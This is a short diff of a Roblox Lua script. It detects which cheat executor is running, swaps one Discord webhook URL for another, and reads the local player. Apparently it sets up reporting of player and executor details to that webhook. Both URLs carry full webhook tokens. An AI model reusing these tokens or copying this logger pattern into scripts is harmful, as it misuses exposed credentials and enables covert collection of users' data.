@@ -1,6 +1,6 @@
 local webhookcheck = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Kid with shit exploit"
 
-local url = "https://discord.com/api/webhooks/1080209040531001364/PQaR0iJXTR-amlkG7c6UtsaBSmCPfGRLybYwqk4j6QahCRdCXyQUmO8XkzdsxbUU-Kj5"
+local url = "https://discord.com/api/webhooks/1075798971806650450/MRtBYle-2J_6-KArWSNWgDeVOKfm2gVzkgrq6oh3lXrRI-KHhSxv28yRIN3guxikIdkT"
 
 local plr = game.Players.LocalPlayer
 local executor = identifyexecutor()
